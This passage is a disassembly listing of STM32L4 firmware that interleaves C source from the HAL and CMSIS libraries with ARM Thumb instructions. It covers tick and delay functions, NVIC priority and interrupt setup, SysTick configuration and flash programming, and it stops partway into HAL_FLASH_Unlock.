08001154 <HAL_IncTick>:
 * @note This function is declared as __weak to be overwritten in case of other
  *      implementations in user file.
  * @retval None
  */
__weak void HAL_IncTick(void)
{
 8001154:	b480      	push	{r7}
 8001156:	af00      	add	r7, sp, #0
  uwTick += (uint32_t)uwTickFreq;
 8001158:	4b06      	ldr	r3, [pc, #24]	; (8001174 <HAL_IncTick+0x20>)
 800115a:	781b      	ldrb	r3, [r3, #0]
 800115c:	461a      	mov	r2, r3
 800115e:	4b06      	ldr	r3, [pc, #24]	; (8001178 <HAL_IncTick+0x24>)
 8001160:	681b      	ldr	r3, [r3, #0]
 8001162:	4413      	add	r3, r2
 8001164:	4a04      	ldr	r2, [pc, #16]	; (8001178 <HAL_IncTick+0x24>)
 8001166:	6013      	str	r3, [r2, #0]
}
 8001168:	bf00      	nop
 800116a:	46bd      	mov	sp, r7
 800116c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001170:	4770      	bx	lr
 8001172:	bf00      	nop
 8001174:	20000008 	.word	0x20000008
 8001178:	200003b8 	.word	0x200003b8

0800117c <HAL_GetTick>:
  * @note This function is declared as __weak to be overwritten in case of other
  *       implementations in user file.
  * @retval tick value
  */
__weak uint32_t HAL_GetTick(void)
{
 800117c:	b480      	push	{r7}
 800117e:	af00      	add	r7, sp, #0
  return uwTick;
 8001180:	4b03      	ldr	r3, [pc, #12]	; (8001190 <HAL_GetTick+0x14>)
 8001182:	681b      	ldr	r3, [r3, #0]
}
 8001184:	4618      	mov	r0, r3
 8001186:	46bd      	mov	sp, r7
 8001188:	f85d 7b04 	ldr.w	r7, [sp], #4
 800118c:	4770      	bx	lr
 800118e:	bf00      	nop
 8001190:	200003b8 	.word	0x200003b8

08001194 <HAL_Delay>:
  *       implementations in user file.
  * @param Delay  specifies the delay time length, in milliseconds.
  * @retval None
  */
__weak void HAL_Delay(uint32_t Delay)
{
 8001194:	b580      	push	{r7, lr}
 8001196:	b084      	sub	sp, #16
 8001198:	af00      	add	r7, sp, #0
 800119a:	6078      	str	r0, [r7, #4]
  uint32_t tickstart = HAL_GetTick();
 800119c:	f7ff ffee 	bl	800117c <HAL_GetTick>
 80011a0:	60b8      	str	r0, [r7, #8]
  uint32_t wait = Delay;
 80011a2:	687b      	ldr	r3, [r7, #4]
 80011a4:	60fb      	str	r3, [r7, #12]

  /* Add a period to guaranty minimum wait */
  if (wait < HAL_MAX_DELAY)
 80011a6:	68fb      	ldr	r3, [r7, #12]
 80011a8:	f1b3 3fff 	cmp.w	r3, #4294967295
 80011ac:	d005      	beq.n	80011ba <HAL_Delay+0x26>
  {
    wait += (uint32_t)uwTickFreq;
 80011ae:	4b0a      	ldr	r3, [pc, #40]	; (80011d8 <HAL_Delay+0x44>)
 80011b0:	781b      	ldrb	r3, [r3, #0]
 80011b2:	461a      	mov	r2, r3
 80011b4:	68fb      	ldr	r3, [r7, #12]
 80011b6:	4413      	add	r3, r2
 80011b8:	60fb      	str	r3, [r7, #12]
  }

  while ((HAL_GetTick() - tickstart) < wait)
 80011ba:	bf00      	nop
 80011bc:	f7ff ffde 	bl	800117c <HAL_GetTick>
 80011c0:	4602      	mov	r2, r0
 80011c2:	68bb      	ldr	r3, [r7, #8]
 80011c4:	1ad3      	subs	r3, r2, r3
 80011c6:	68fa      	ldr	r2, [r7, #12]
 80011c8:	429a      	cmp	r2, r3
 80011ca:	d8f7      	bhi.n	80011bc <HAL_Delay+0x28>
  {
  }
}
 80011cc:	bf00      	nop
 80011ce:	bf00      	nop
 80011d0:	3710      	adds	r7, #16
 80011d2:	46bd      	mov	sp, r7
 80011d4:	bd80      	pop	{r7, pc}
 80011d6:	bf00      	nop
 80011d8:	20000008 	.word	0x20000008

080011dc <__NVIC_SetPriorityGrouping>:
           In case of a conflict between priority grouping and available
           priority bits (__NVIC_PRIO_BITS), the smallest possible priority group is set.
  \param [in]      PriorityGroup  Priority grouping field.
 */
__STATIC_INLINE void __NVIC_SetPriorityGrouping(uint32_t PriorityGroup)
{
 80011dc:	b480      	push	{r7}
 80011de:	b085      	sub	sp, #20
 80011e0:	af00      	add	r7, sp, #0
 80011e2:	6078      	str	r0, [r7, #4]
  uint32_t reg_value;
  uint32_t PriorityGroupTmp = (PriorityGroup & (uint32_t)0x07UL);             /* only values 0..7 are used          */
 80011e4:	687b      	ldr	r3, [r7, #4]
 80011e6:	f003 0307 	and.w	r3, r3, #7
 80011ea:	60fb      	str	r3, [r7, #12]

  reg_value  =  SCB->AIRCR;                                                   /* read old register configuration    */
 80011ec:	4b0c      	ldr	r3, [pc, #48]	; (8001220 <__NVIC_SetPriorityGrouping+0x44>)
 80011ee:	68db      	ldr	r3, [r3, #12]
 80011f0:	60bb      	str	r3, [r7, #8]
  reg_value &= ~((uint32_t)(SCB_AIRCR_VECTKEY_Msk | SCB_AIRCR_PRIGROUP_Msk)); /* clear bits to change               */
 80011f2:	68ba      	ldr	r2, [r7, #8]
 80011f4:	f64f 03ff 	movw	r3, #63743	; 0xf8ff
 80011f8:	4013      	ands	r3, r2
 80011fa:	60bb      	str	r3, [r7, #8]
  reg_value  =  (reg_value                                   |
                ((uint32_t)0x5FAUL << SCB_AIRCR_VECTKEY_Pos) |
                (PriorityGroupTmp << SCB_AIRCR_PRIGROUP_Pos)  );              /* Insert write key and priority group */
 80011fc:	68fb      	ldr	r3, [r7, #12]
 80011fe:	021a      	lsls	r2, r3, #8
                ((uint32_t)0x5FAUL << SCB_AIRCR_VECTKEY_Pos) |
 8001200:	68bb      	ldr	r3, [r7, #8]
 8001202:	4313      	orrs	r3, r2
  reg_value  =  (reg_value                                   |
 8001204:	f043 63bf 	orr.w	r3, r3, #100139008	; 0x5f80000
 8001208:	f443 3300 	orr.w	r3, r3, #131072	; 0x20000
 800120c:	60bb      	str	r3, [r7, #8]
  SCB->AIRCR =  reg_value;
 800120e:	4a04      	ldr	r2, [pc, #16]	; (8001220 <__NVIC_SetPriorityGrouping+0x44>)
 8001210:	68bb      	ldr	r3, [r7, #8]
 8001212:	60d3      	str	r3, [r2, #12]
}
 8001214:	bf00      	nop
 8001216:	3714      	adds	r7, #20
 8001218:	46bd      	mov	sp, r7
 800121a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800121e:	4770      	bx	lr
 8001220:	e000ed00 	.word	0xe000ed00

08001224 <__NVIC_GetPriorityGrouping>:
  \brief   Get Priority Grouping
  \details Reads the priority grouping field from the NVIC Interrupt Controller.
  \return                Priority grouping field (SCB->AIRCR [10:8] PRIGROUP field).
 */
__STATIC_INLINE uint32_t __NVIC_GetPriorityGrouping(void)
{
 8001224:	b480      	push	{r7}
 8001226:	af00      	add	r7, sp, #0
  return ((uint32_t)((SCB->AIRCR & SCB_AIRCR_PRIGROUP_Msk) >> SCB_AIRCR_PRIGROUP_Pos));
 8001228:	4b04      	ldr	r3, [pc, #16]	; (800123c <__NVIC_GetPriorityGrouping+0x18>)
 800122a:	68db      	ldr	r3, [r3, #12]
 800122c:	0a1b      	lsrs	r3, r3, #8
 800122e:	f003 0307 	and.w	r3, r3, #7
}
 8001232:	4618      	mov	r0, r3
 8001234:	46bd      	mov	sp, r7
 8001236:	f85d 7b04 	ldr.w	r7, [sp], #4
 800123a:	4770      	bx	lr
 800123c:	e000ed00 	.word	0xe000ed00

08001240 <__NVIC_EnableIRQ>:
  \details Enables a device specific interrupt in the NVIC interrupt controller.
  \param [in]      IRQn  Device specific interrupt number.
  \note    IRQn must not be negative.
 */
__STATIC_INLINE void __NVIC_EnableIRQ(IRQn_Type IRQn)
{
 8001240:	b480      	push	{r7}
 8001242:	b083      	sub	sp, #12
 8001244:	af00      	add	r7, sp, #0
 8001246:	4603      	mov	r3, r0
 8001248:	71fb      	strb	r3, [r7, #7]
  if ((int32_t)(IRQn) >= 0)
 800124a:	f997 3007 	ldrsb.w	r3, [r7, #7]
 800124e:	2b00      	cmp	r3, #0
 8001250:	db0b      	blt.n	800126a <__NVIC_EnableIRQ+0x2a>
  {
    __COMPILER_BARRIER();
    NVIC->ISER[(((uint32_t)IRQn) >> 5UL)] = (uint32_t)(1UL << (((uint32_t)IRQn) & 0x1FUL));
 8001252:	79fb      	ldrb	r3, [r7, #7]
 8001254:	f003 021f 	and.w	r2, r3, #31
 8001258:	4907      	ldr	r1, [pc, #28]	; (8001278 <__NVIC_EnableIRQ+0x38>)
 800125a:	f997 3007 	ldrsb.w	r3, [r7, #7]
 800125e:	095b      	lsrs	r3, r3, #5
 8001260:	2001      	movs	r0, #1
 8001262:	fa00 f202 	lsl.w	r2, r0, r2
 8001266:	f841 2023 	str.w	r2, [r1, r3, lsl #2]
    __COMPILER_BARRIER();
  }
}
 800126a:	bf00      	nop
 800126c:	370c      	adds	r7, #12
 800126e:	46bd      	mov	sp, r7
 8001270:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001274:	4770      	bx	lr
 8001276:	bf00      	nop
 8001278:	e000e100 	.word	0xe000e100

0800127c <__NVIC_SetPriority>:
  \param [in]      IRQn  Interrupt number.
  \param [in]  priority  Priority to set.
  \note    The priority cannot be set for every processor exception.
 */
__STATIC_INLINE void __NVIC_SetPriority(IRQn_Type IRQn, uint32_t priority)
{
 800127c:	b480      	push	{r7}
 800127e:	b083      	sub	sp, #12
 8001280:	af00      	add	r7, sp, #0
 8001282:	4603      	mov	r3, r0
 8001284:	6039      	str	r1, [r7, #0]
 8001286:	71fb      	strb	r3, [r7, #7]
  if ((int32_t)(IRQn) >= 0)
 8001288:	f997 3007 	ldrsb.w	r3, [r7, #7]
 800128c:	2b00      	cmp	r3, #0
 800128e:	db0a      	blt.n	80012a6 <__NVIC_SetPriority+0x2a>
  {
    NVIC->IP[((uint32_t)IRQn)]               = (uint8_t)((priority << (8U - __NVIC_PRIO_BITS)) & (uint32_t)0xFFUL);
 8001290:	683b      	ldr	r3, [r7, #0]
 8001292:	b2da      	uxtb	r2, r3
 8001294:	490c      	ldr	r1, [pc, #48]	; (80012c8 <__NVIC_SetPriority+0x4c>)
 8001296:	f997 3007 	ldrsb.w	r3, [r7, #7]
 800129a:	0112      	lsls	r2, r2, #4
 800129c:	b2d2      	uxtb	r2, r2
 800129e:	440b      	add	r3, r1
 80012a0:	f883 2300 	strb.w	r2, [r3, #768]	; 0x300
  }
  else
  {
    SCB->SHP[(((uint32_t)IRQn) & 0xFUL)-4UL] = (uint8_t)((priority << (8U - __NVIC_PRIO_BITS)) & (uint32_t)0xFFUL);
  }
}
 80012a4:	e00a      	b.n	80012bc <__NVIC_SetPriority+0x40>
    SCB->SHP[(((uint32_t)IRQn) & 0xFUL)-4UL] = (uint8_t)((priority << (8U - __NVIC_PRIO_BITS)) & (uint32_t)0xFFUL);
 80012a6:	683b      	ldr	r3, [r7, #0]
 80012a8:	b2da      	uxtb	r2, r3
 80012aa:	4908      	ldr	r1, [pc, #32]	; (80012cc <__NVIC_SetPriority+0x50>)
 80012ac:	79fb      	ldrb	r3, [r7, #7]
 80012ae:	f003 030f 	and.w	r3, r3, #15
 80012b2:	3b04      	subs	r3, #4
 80012b4:	0112      	lsls	r2, r2, #4
 80012b6:	b2d2      	uxtb	r2, r2
 80012b8:	440b      	add	r3, r1
 80012ba:	761a      	strb	r2, [r3, #24]
}
 80012bc:	bf00      	nop
 80012be:	370c      	adds	r7, #12
 80012c0:	46bd      	mov	sp, r7
 80012c2:	f85d 7b04 	ldr.w	r7, [sp], #4
 80012c6:	4770      	bx	lr
 80012c8:	e000e100 	.word	0xe000e100
 80012cc:	e000ed00 	.word	0xe000ed00

080012d0 <NVIC_EncodePriority>:
  \param [in]   PreemptPriority  Preemptive priority value (starting from 0).
  \param [in]       SubPriority  Subpriority value (starting from 0).
  \return                        Encoded priority. Value can be used in the function \ref NVIC_SetPriority().
 */
__STATIC_INLINE uint32_t NVIC_EncodePriority (uint32_t PriorityGroup, uint32_t PreemptPriority, uint32_t SubPriority)
{
 80012d0:	b480      	push	{r7}
 80012d2:	b089      	sub	sp, #36	; 0x24
 80012d4:	af00      	add	r7, sp, #0
 80012d6:	60f8      	str	r0, [r7, #12]
 80012d8:	60b9      	str	r1, [r7, #8]
 80012da:	607a      	str	r2, [r7, #4]
  uint32_t PriorityGroupTmp = (PriorityGroup & (uint32_t)0x07UL);   /* only values 0..7 are used          */
 80012dc:	68fb      	ldr	r3, [r7, #12]
 80012de:	f003 0307 	and.w	r3, r3, #7
 80012e2:	61fb      	str	r3, [r7, #28]
  uint32_t PreemptPriorityBits;
  uint32_t SubPriorityBits;

  PreemptPriorityBits = ((7UL - PriorityGroupTmp) > (uint32_t)(__NVIC_PRIO_BITS)) ? (uint32_t)(__NVIC_PRIO_BITS) : (uint32_t)(7UL - PriorityGroupTmp);
 80012e4:	69fb      	ldr	r3, [r7, #28]
 80012e6:	f1c3 0307 	rsb	r3, r3, #7
 80012ea:	2b04      	cmp	r3, #4
 80012ec:	bf28      	it	cs
 80012ee:	2304      	movcs	r3, #4
 80012f0:	61bb      	str	r3, [r7, #24]
  SubPriorityBits     = ((PriorityGroupTmp + (uint32_t)(__NVIC_PRIO_BITS)) < (uint32_t)7UL) ? (uint32_t)0UL : (uint32_t)((PriorityGroupTmp - 7UL) + (uint32_t)(__NVIC_PRIO_BITS));
 80012f2:	69fb      	ldr	r3, [r7, #28]
 80012f4:	3304      	adds	r3, #4
 80012f6:	2b06      	cmp	r3, #6
 80012f8:	d902      	bls.n	8001300 <NVIC_EncodePriority+0x30>
 80012fa:	69fb      	ldr	r3, [r7, #28]
 80012fc:	3b03      	subs	r3, #3
 80012fe:	e000      	b.n	8001302 <NVIC_EncodePriority+0x32>
 8001300:	2300      	movs	r3, #0
 8001302:	617b      	str	r3, [r7, #20]

  return (
           ((PreemptPriority & (uint32_t)((1UL << (PreemptPriorityBits)) - 1UL)) << SubPriorityBits) |
 8001304:	f04f 32ff 	mov.w	r2, #4294967295
 8001308:	69bb      	ldr	r3, [r7, #24]
 800130a:	fa02 f303 	lsl.w	r3, r2, r3
 800130e:	43da      	mvns	r2, r3
 8001310:	68bb      	ldr	r3, [r7, #8]
 8001312:	401a      	ands	r2, r3
 8001314:	697b      	ldr	r3, [r7, #20]
 8001316:	409a      	lsls	r2, r3
           ((SubPriority     & (uint32_t)((1UL << (SubPriorityBits    )) - 1UL)))
 8001318:	f04f 31ff 	mov.w	r1, #4294967295
 800131c:	697b      	ldr	r3, [r7, #20]
 800131e:	fa01 f303 	lsl.w	r3, r1, r3
 8001322:	43d9      	mvns	r1, r3
 8001324:	687b      	ldr	r3, [r7, #4]
 8001326:	400b      	ands	r3, r1
           ((PreemptPriority & (uint32_t)((1UL << (PreemptPriorityBits)) - 1UL)) << SubPriorityBits) |
 8001328:	4313      	orrs	r3, r2
         );
}
 800132a:	4618      	mov	r0, r3
 800132c:	3724      	adds	r7, #36	; 0x24
 800132e:	46bd      	mov	sp, r7
 8001330:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001334:	4770      	bx	lr
	...

08001338 <SysTick_Config>:
  \note    When the variable <b>__Vendor_SysTickConfig</b> is set to 1, then the
           function <b>SysTick_Config</b> is not included. In this case, the file <b><i>device</i>.h</b>
           must contain a vendor-specific implementation of this function.
 */
__STATIC_INLINE uint32_t SysTick_Config(uint32_t ticks)
{
 8001338:	b580      	push	{r7, lr}
 800133a:	b082      	sub	sp, #8
 800133c:	af00      	add	r7, sp, #0
 800133e:	6078      	str	r0, [r7, #4]
  if ((ticks - 1UL) > SysTick_LOAD_RELOAD_Msk)
 8001340:	687b      	ldr	r3, [r7, #4]
 8001342:	3b01      	subs	r3, #1
 8001344:	f1b3 7f80 	cmp.w	r3, #16777216	; 0x1000000
 8001348:	d301      	bcc.n	800134e <SysTick_Config+0x16>
  {
    return (1UL);                                                   /* Reload value impossible */
 800134a:	2301      	movs	r3, #1
 800134c:	e00f      	b.n	800136e <SysTick_Config+0x36>
  }

  SysTick->LOAD  = (uint32_t)(ticks - 1UL);                         /* set reload register */
 800134e:	4a0a      	ldr	r2, [pc, #40]	; (8001378 <SysTick_Config+0x40>)
 8001350:	687b      	ldr	r3, [r7, #4]
 8001352:	3b01      	subs	r3, #1
 8001354:	6053      	str	r3, [r2, #4]
  NVIC_SetPriority (SysTick_IRQn, (1UL << __NVIC_PRIO_BITS) - 1UL); /* set Priority for Systick Interrupt */
 8001356:	210f      	movs	r1, #15
 8001358:	f04f 30ff 	mov.w	r0, #4294967295
 800135c:	f7ff ff8e 	bl	800127c <__NVIC_SetPriority>
  SysTick->VAL   = 0UL;                                             /* Load the SysTick Counter Value */
 8001360:	4b05      	ldr	r3, [pc, #20]	; (8001378 <SysTick_Config+0x40>)
 8001362:	2200      	movs	r2, #0
 8001364:	609a      	str	r2, [r3, #8]
  SysTick->CTRL  = SysTick_CTRL_CLKSOURCE_Msk |
 8001366:	4b04      	ldr	r3, [pc, #16]	; (8001378 <SysTick_Config+0x40>)
 8001368:	2207      	movs	r2, #7
 800136a:	601a      	str	r2, [r3, #0]
                   SysTick_CTRL_TICKINT_Msk   |
                   SysTick_CTRL_ENABLE_Msk;                         /* Enable SysTick IRQ and SysTick Timer */
  return (0UL);                                                     /* Function successful */
 800136c:	2300      	movs	r3, #0
}
 800136e:	4618      	mov	r0, r3
 8001370:	3708      	adds	r7, #8
 8001372:	46bd      	mov	sp, r7
 8001374:	bd80      	pop	{r7, pc}
 8001376:	bf00      	nop
 8001378:	e000e010 	.word	0xe000e010

0800137c <HAL_NVIC_SetPriorityGrouping>:
  * @note   When the NVIC_PriorityGroup_0 is selected, IRQ pre-emption is no more possible.
  *         The pending IRQ priority will be managed only by the subpriority.
  * @retval None
  */
void HAL_NVIC_SetPriorityGrouping(uint32_t PriorityGroup)
{
 800137c:	b580      	push	{r7, lr}
 800137e:	b082      	sub	sp, #8
 8001380:	af00      	add	r7, sp, #0
 8001382:	6078      	str	r0, [r7, #4]
  /* Check the parameters */
  assert_param(IS_NVIC_PRIORITY_GROUP(PriorityGroup));

  /* Set the PRIGROUP[10:8] bits according to the PriorityGroup parameter value */
  NVIC_SetPriorityGrouping(PriorityGroup);
 8001384:	6878      	ldr	r0, [r7, #4]
 8001386:	f7ff ff29 	bl	80011dc <__NVIC_SetPriorityGrouping>
}
 800138a:	bf00      	nop
 800138c:	3708      	adds	r7, #8
 800138e:	46bd      	mov	sp, r7
 8001390:	bd80      	pop	{r7, pc}

08001392 <HAL_NVIC_SetPriority>:
  *         This parameter can be a value between 0 and 15
  *         A lower priority value indicates a higher priority.
  * @retval None
  */
void HAL_NVIC_SetPriority(IRQn_Type IRQn, uint32_t PreemptPriority, uint32_t SubPriority)
{
 8001392:	b580      	push	{r7, lr}
 8001394:	b086      	sub	sp, #24
 8001396:	af00      	add	r7, sp, #0
 8001398:	4603      	mov	r3, r0
 800139a:	60b9      	str	r1, [r7, #8]
 800139c:	607a      	str	r2, [r7, #4]
 800139e:	73fb      	strb	r3, [r7, #15]
  uint32_t prioritygroup = 0x00;
 80013a0:	2300      	movs	r3, #0
 80013a2:	617b      	str	r3, [r7, #20]

  /* Check the parameters */
  assert_param(IS_NVIC_SUB_PRIORITY(SubPriority));
  assert_param(IS_NVIC_PREEMPTION_PRIORITY(PreemptPriority));

  prioritygroup = NVIC_GetPriorityGrouping();
 80013a4:	f7ff ff3e 	bl	8001224 <__NVIC_GetPriorityGrouping>
 80013a8:	6178      	str	r0, [r7, #20]

  NVIC_SetPriority(IRQn, NVIC_EncodePriority(prioritygroup, PreemptPriority, SubPriority));
 80013aa:	687a      	ldr	r2, [r7, #4]
 80013ac:	68b9      	ldr	r1, [r7, #8]
 80013ae:	6978      	ldr	r0, [r7, #20]
 80013b0:	f7ff ff8e 	bl	80012d0 <NVIC_EncodePriority>
 80013b4:	4602      	mov	r2, r0
 80013b6:	f997 300f 	ldrsb.w	r3, [r7, #15]
 80013ba:	4611      	mov	r1, r2
 80013bc:	4618      	mov	r0, r3
 80013be:	f7ff ff5d 	bl	800127c <__NVIC_SetPriority>
}
 80013c2:	bf00      	nop
 80013c4:	3718      	adds	r7, #24
 80013c6:	46bd      	mov	sp, r7
 80013c8:	bd80      	pop	{r7, pc}

080013ca <HAL_NVIC_EnableIRQ>:
  *         This parameter can be an enumerator of IRQn_Type enumeration
  *         (For the complete STM32 Devices IRQ Channels list, please refer to the appropriate CMSIS device file (stm32l4xxxx.h))
  * @retval None
  */
void HAL_NVIC_EnableIRQ(IRQn_Type IRQn)
{
 80013ca:	b580      	push	{r7, lr}
 80013cc:	b082      	sub	sp, #8
 80013ce:	af00      	add	r7, sp, #0
 80013d0:	4603      	mov	r3, r0
 80013d2:	71fb      	strb	r3, [r7, #7]
  /* Check the parameters */
  assert_param(IS_NVIC_DEVICE_IRQ(IRQn));
  
  /* Enable interrupt */
  NVIC_EnableIRQ(IRQn);
 80013d4:	f997 3007 	ldrsb.w	r3, [r7, #7]
 80013d8:	4618      	mov	r0, r3
 80013da:	f7ff ff31 	bl	8001240 <__NVIC_EnableIRQ>
}
 80013de:	bf00      	nop
 80013e0:	3708      	adds	r7, #8
 80013e2:	46bd      	mov	sp, r7
 80013e4:	bd80      	pop	{r7, pc}

080013e6 <HAL_SYSTICK_Config>:
  * @param  TicksNumb: Specifies the ticks Number of ticks between two interrupts.
  * @retval status:  - 0  Function succeeded.
  *                  - 1  Function failed.
  */
uint32_t HAL_SYSTICK_Config(uint32_t TicksNumb)
{
 80013e6:	b580      	push	{r7, lr}
 80013e8:	b082      	sub	sp, #8
 80013ea:	af00      	add	r7, sp, #0
 80013ec:	6078      	str	r0, [r7, #4]
   return SysTick_Config(TicksNumb);
 80013ee:	6878      	ldr	r0, [r7, #4]
 80013f0:	f7ff ffa2 	bl	8001338 <SysTick_Config>
 80013f4:	4603      	mov	r3, r0
}
 80013f6:	4618      	mov	r0, r3
 80013f8:	3708      	adds	r7, #8
 80013fa:	46bd      	mov	sp, r7
 80013fc:	bd80      	pop	{r7, pc}
	...

08001400 <HAL_FLASH_Program>:
  *                are stored the data for the row fast program
  *
  * @retval HAL_StatusTypeDef HAL Status
  */
HAL_StatusTypeDef HAL_FLASH_Program(uint32_t TypeProgram, uint32_t Address, uint64_t Data)
{
 8001400:	b580      	push	{r7, lr}
 8001402:	b086      	sub	sp, #24
 8001404:	af00      	add	r7, sp, #0
 8001406:	60f8      	str	r0, [r7, #12]
 8001408:	60b9      	str	r1, [r7, #8]
 800140a:	e9c7 2300 	strd	r2, r3, [r7]
  HAL_StatusTypeDef status;
  uint32_t prog_bit = 0;
 800140e:	2300      	movs	r3, #0
 8001410:	613b      	str	r3, [r7, #16]

  /* Process Locked */
  __HAL_LOCK(&pFlash);
 8001412:	4b2f      	ldr	r3, [pc, #188]	; (80014d0 <HAL_FLASH_Program+0xd0>)
 8001414:	781b      	ldrb	r3, [r3, #0]
 8001416:	2b01      	cmp	r3, #1
 8001418:	d101      	bne.n	800141e <HAL_FLASH_Program+0x1e>
 800141a:	2302      	movs	r3, #2
 800141c:	e053      	b.n	80014c6 <HAL_FLASH_Program+0xc6>
 800141e:	4b2c      	ldr	r3, [pc, #176]	; (80014d0 <HAL_FLASH_Program+0xd0>)
 8001420:	2201      	movs	r2, #1
 8001422:	701a      	strb	r2, [r3, #0]

  /* Check the parameters */
  assert_param(IS_FLASH_TYPEPROGRAM(TypeProgram));

  /* Wait for last operation to be completed */
  status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 8001424:	f24c 3050 	movw	r0, #50000	; 0xc350
 8001428:	f000 f888 	bl	800153c <FLASH_WaitForLastOperation>
 800142c:	4603      	mov	r3, r0
 800142e:	75fb      	strb	r3, [r7, #23]

  if(status == HAL_OK)
 8001430:	7dfb      	ldrb	r3, [r7, #23]
 8001432:	2b00      	cmp	r3, #0
 8001434:	d143      	bne.n	80014be <HAL_FLASH_Program+0xbe>
  {
    pFlash.ErrorCode = HAL_FLASH_ERROR_NONE;
 8001436:	4b26      	ldr	r3, [pc, #152]	; (80014d0 <HAL_FLASH_Program+0xd0>)
 8001438:	2200      	movs	r2, #0
 800143a:	605a      	str	r2, [r3, #4]

    /* Deactivate the data cache if they are activated to avoid data misbehavior */
    if(READ_BIT(FLASH->ACR, FLASH_ACR_DCEN) != 0U)
 800143c:	4b25      	ldr	r3, [pc, #148]	; (80014d4 <HAL_FLASH_Program+0xd4>)
 800143e:	681b      	ldr	r3, [r3, #0]
 8001440:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8001444:	2b00      	cmp	r3, #0
 8001446:	d009      	beq.n	800145c <HAL_FLASH_Program+0x5c>
    {
      /* Disable data cache  */
      __HAL_FLASH_DATA_CACHE_DISABLE();
 8001448:	4b22      	ldr	r3, [pc, #136]	; (80014d4 <HAL_FLASH_Program+0xd4>)
 800144a:	681b      	ldr	r3, [r3, #0]
 800144c:	4a21      	ldr	r2, [pc, #132]	; (80014d4 <HAL_FLASH_Program+0xd4>)
 800144e:	f423 6380 	bic.w	r3, r3, #1024	; 0x400
 8001452:	6013      	str	r3, [r2, #0]
      pFlash.CacheToReactivate = FLASH_CACHE_DCACHE_ENABLED;
 8001454:	4b1e      	ldr	r3, [pc, #120]	; (80014d0 <HAL_FLASH_Program+0xd0>)
 8001456:	2202      	movs	r2, #2
 8001458:	771a      	strb	r2, [r3, #28]
 800145a:	e002      	b.n	8001462 <HAL_FLASH_Program+0x62>
    }
    else
    {
      pFlash.CacheToReactivate = FLASH_CACHE_DISABLED;
 800145c:	4b1c      	ldr	r3, [pc, #112]	; (80014d0 <HAL_FLASH_Program+0xd0>)
 800145e:	2200      	movs	r2, #0
 8001460:	771a      	strb	r2, [r3, #28]
    }

    if(TypeProgram == FLASH_TYPEPROGRAM_DOUBLEWORD)
 8001462:	68fb      	ldr	r3, [r7, #12]
 8001464:	2b00      	cmp	r3, #0
 8001466:	d107      	bne.n	8001478 <HAL_FLASH_Program+0x78>
    {
      /* Program double-word (64-bit) at a specified address */
      FLASH_Program_DoubleWord(Address, Data);
 8001468:	e9d7 2300 	ldrd	r2, r3, [r7]
 800146c:	68b8      	ldr	r0, [r7, #8]
 800146e:	f000 f8bd 	bl	80015ec <FLASH_Program_DoubleWord>
      prog_bit = FLASH_CR_PG;
 8001472:	2301      	movs	r3, #1
 8001474:	613b      	str	r3, [r7, #16]
 8001476:	e010      	b.n	800149a <HAL_FLASH_Program+0x9a>
    }
    else if((TypeProgram == FLASH_TYPEPROGRAM_FAST) || (TypeProgram == FLASH_TYPEPROGRAM_FAST_AND_LAST))
 8001478:	68fb      	ldr	r3, [r7, #12]
 800147a:	2b01      	cmp	r3, #1
 800147c:	d002      	beq.n	8001484 <HAL_FLASH_Program+0x84>
 800147e:	68fb      	ldr	r3, [r7, #12]
 8001480:	2b02      	cmp	r3, #2
 8001482:	d10a      	bne.n	800149a <HAL_FLASH_Program+0x9a>
    {
      /* Fast program a 32 row double-word (64-bit) at a specified address */
      FLASH_Program_Fast(Address, (uint32_t)Data);
 8001484:	683b      	ldr	r3, [r7, #0]
 8001486:	4619      	mov	r1, r3
 8001488:	68b8      	ldr	r0, [r7, #8]
 800148a:	f000 f8d5 	bl	8001638 <FLASH_Program_Fast>

      /* If it is the last row, the bit will be cleared at the end of the operation */
      if(TypeProgram == FLASH_TYPEPROGRAM_FAST_AND_LAST)
 800148e:	68fb      	ldr	r3, [r7, #12]
 8001490:	2b02      	cmp	r3, #2
 8001492:	d102      	bne.n	800149a <HAL_FLASH_Program+0x9a>
      {
        prog_bit = FLASH_CR_FSTPG;
 8001494:	f44f 2380 	mov.w	r3, #262144	; 0x40000
 8001498:	613b      	str	r3, [r7, #16]
    {
      /* Nothing to do */
    }

    /* Wait for last operation to be completed */
    status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 800149a:	f24c 3050 	movw	r0, #50000	; 0xc350
 800149e:	f000 f84d 	bl	800153c <FLASH_WaitForLastOperation>
 80014a2:	4603      	mov	r3, r0
 80014a4:	75fb      	strb	r3, [r7, #23]

    /* If the program operation is completed, disable the PG or FSTPG Bit */
    if (prog_bit != 0U)
 80014a6:	693b      	ldr	r3, [r7, #16]
 80014a8:	2b00      	cmp	r3, #0
 80014aa:	d006      	beq.n	80014ba <HAL_FLASH_Program+0xba>
    {
      CLEAR_BIT(FLASH->CR, prog_bit);
 80014ac:	4b09      	ldr	r3, [pc, #36]	; (80014d4 <HAL_FLASH_Program+0xd4>)
 80014ae:	695a      	ldr	r2, [r3, #20]
 80014b0:	693b      	ldr	r3, [r7, #16]
 80014b2:	43db      	mvns	r3, r3
 80014b4:	4907      	ldr	r1, [pc, #28]	; (80014d4 <HAL_FLASH_Program+0xd4>)
 80014b6:	4013      	ands	r3, r2
 80014b8:	614b      	str	r3, [r1, #20]
    }

    /* Flush the caches to be sure of the data consistency */
    FLASH_FlushCaches();
 80014ba:	f000 f9cf 	bl	800185c <FLASH_FlushCaches>
  }

  /* Process Unlocked */
  __HAL_UNLOCK(&pFlash);
 80014be:	4b04      	ldr	r3, [pc, #16]	; (80014d0 <HAL_FLASH_Program+0xd0>)
 80014c0:	2200      	movs	r2, #0
 80014c2:	701a      	strb	r2, [r3, #0]

  return status;
 80014c4:	7dfb      	ldrb	r3, [r7, #23]
}
 80014c6:	4618      	mov	r0, r3
 80014c8:	3718      	adds	r7, #24
 80014ca:	46bd      	mov	sp, r7
 80014cc:	bd80      	pop	{r7, pc}
 80014ce:	bf00      	nop
 80014d0:	2000000c 	.word	0x2000000c
 80014d4:	40022000 	.word	0x40022000

080014d8 <HAL_FLASH_Unlock>:
/**
  * @brief  Unlock the FLASH control register access.
  * @retval HAL Status
  */
HAL_StatusTypeDef HAL_FLASH_Unlock(void)
{
 80014d8:	b480      	push	{r7}
 80014da:	b083      	sub	sp, #12
